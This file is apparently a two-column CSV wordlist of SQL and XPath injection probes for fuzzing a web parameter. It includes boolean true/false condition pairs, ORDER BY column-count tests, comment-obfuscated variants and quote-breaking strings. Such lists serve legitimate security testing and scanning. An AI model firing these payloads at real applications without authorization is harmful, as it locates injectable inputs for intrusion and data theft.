Payload1,Payload2
2,2
2 and 456=678,2
2 or 345=345,2
2 order by 9999,2
2 order by 1,2
2/0 and 456=678,2
2/1 or 345=345,2
2/*f*/and/*f*/456=678,2
2/*f*/or/*f*/345=345,2
2' or '345'='345 ,2
2' and '456'='678,2
2' and 'fghi'='fghj'-- #,2
2' or 'dfth'='dfth'-- #,2
2' order by 9999-- #,2
2' order by 1-- #,2
2'and/*g*/456=678-- #,2
2'or/*g*/345=345-- #,2
2' and '456'='678,2
2' or '345'='345,2
2' and 'fghi'='fghj'#,2
2' or 'dfth'='dfth'#,2
2' order by 9999#,2
2' order by 1#,2
2'||/**/456=678#,2
2'||/**/345=345#,2
2' and '456'='678,2
2' or '345'='345,2
2' and 'fghi'='fghj'--,2
2' or 'dfth'='dfth'--,2
2' order by 9999--,2
2' order by 1--,2
2'and/*d*/456=678--,2
2'or/*d*/345=345--,2
2' and '456'='678,2
2' or '345'='345,2
2' and 'fghi'='fghj'-- #,2
2' or 'dfth'='dfth'-- #,2
2' order by 9999-- #,2
2' order by 1-- #,2
2'and/*g*/456=678-- #,2
2'or/*g*/345=345-- #,2
2'%5d|//*|/a%5b'a,2
2'%5d|//a|/a%5b'a,2
"2')%5d|//*|/a%5bcontains(a,'b",2
"2')%5d|//a|/a%5bcontains(a,'b",2
"2"" and ""456""=""678",2
"2"" or ""345""=""345",2
"2"" and ""fghi""=""fghj""-- #",2
"2"" or ""dfth""=""dfth""-- #",2
"2"" order by 9999-- #",2
"2"" order by 1-- #",2
"2""and/*g*/456=678-- #",2
"2""or/*g*/345=345-- #",2
"2""%5d|//*|/a%5b""a",2
"2""%5d|//a|/a%5b""a",2
"2"")%5d|//*|/a%5bcontains(a,""b",2
"2"")%5d|//a|/a%5bcontains(a,""b",2
